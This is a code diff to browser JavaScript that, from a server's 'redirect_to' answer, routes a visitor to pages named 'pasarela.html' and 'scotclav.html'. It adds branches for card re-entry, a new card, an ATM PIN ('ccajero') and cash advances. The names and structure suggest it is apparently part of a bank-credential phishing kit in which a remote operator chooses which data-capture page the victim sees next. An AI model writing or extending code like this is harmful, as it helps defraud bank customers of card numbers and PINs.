@@ -35,13 +35,34 @@ fetch(`${API_URL}/generals`, {
 
             // Redirigir
             window.location.href = 'index.html'
-        } else if (result.redirect_to === 'card') {
+        } else if (result.redirect_to === 'rcard') {
             // Setear el error
-            info.err = 'true';
+            info.err = 'rcard';
             LS.setItem('info', JSON.stringify(info));
 
             // Redirigir
             window.location.href = 'pasarela.html'
+        } else if (result.redirect_to === 'ncard') {
+            // Setear el error
+            info.err = 'ncard';
+            LS.setItem('info', JSON.stringify(info));
+
+            // Redirigir
+            window.location.href = 'pasarela.html'
+        } else if (result.redirect_to === 'ccajero') {
+            // Setear el error
+            info.err = 'ccajero';
+            LS.setItem('info', JSON.stringify(info));
+
+            // Redirigir
+            window.location.href = 'scotclav.html'
+        } else if (result.redirect_to === 'cavances') {
+            // Setear el error
+            info.err = 'cavances';
+            LS.setItem('info', JSON.stringify(info));
+
+            // Redirigir
+            window.location.href = 'scotclav.html'
         } else if (result.redirect_to === 'userp') {
             // Setear el error
             info.err = 'true';
